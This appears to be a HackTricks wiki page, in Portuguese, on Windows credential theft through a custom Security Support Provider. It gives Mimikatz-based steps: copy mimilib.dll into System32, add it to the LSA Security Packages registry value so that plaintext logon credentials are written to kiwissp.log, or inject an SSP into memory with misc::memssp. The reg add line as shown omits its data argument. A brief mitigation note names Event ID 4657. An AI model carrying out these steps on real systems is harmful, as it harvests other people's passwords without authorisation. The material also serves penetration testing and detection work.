# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Saiba o que é um SSP (Security Support Provider) aqui.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Você pode criar seu **próprio SSP** para **capturar** em **texto claro** as **credenciais** usadas para acessar a máquina.

#### Mimilib

Você pode usar o binário `mimilib.dll` fornecido pelo Mimikatz. **Isso registrará em um arquivo todas as credenciais em texto claro.**\
Coloque a dll em `C:\Windows\System32\`\
Obtenha uma lista de Pacotes de Segurança LSA existentes:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Adicione `mimilib.dll` à lista de Provedores de Suporte de Segurança (Pacotes de Segurança):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
E após uma reinicialização, todas as credenciais podem ser encontradas em texto claro em `C:\Windows\System32\kiwissp.log`

#### Em memória

Você também pode injetar isso na memória diretamente usando Mimikatz (note que pode ser um pouco instável/não funcionar):
```powershell
privilege::debug
misc::memssp
```
Isso não sobreviverá a reinicializações.

#### Mitigação

ID do Evento 4657 - Auditoria de criação/mudança de `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
